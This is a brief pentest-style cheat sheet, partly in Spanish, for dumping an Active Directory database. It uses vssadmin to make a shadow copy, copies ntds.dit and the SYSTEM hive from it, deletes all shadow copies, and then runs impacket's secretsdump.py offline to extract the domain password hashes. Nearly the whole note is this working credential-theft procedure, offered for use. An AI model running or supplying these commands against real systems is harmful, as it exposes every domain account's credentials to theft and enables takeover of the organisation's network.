# Dump AD

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[ID]\windows\ntds\ntds.dit .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[ID]\windows\system32\config\SYSTEM .
vssadmin delete shadows /All
```

Realizar el dump:

```bash
~/Documents/impacket/examples# secretsdump.py -system /1T/hv09kali/ad/SYSTEM -ntds /1T/hv09kali/ad/ntds.dit LOCAL -outputfile /1T/hv09kali/ad/ad
```
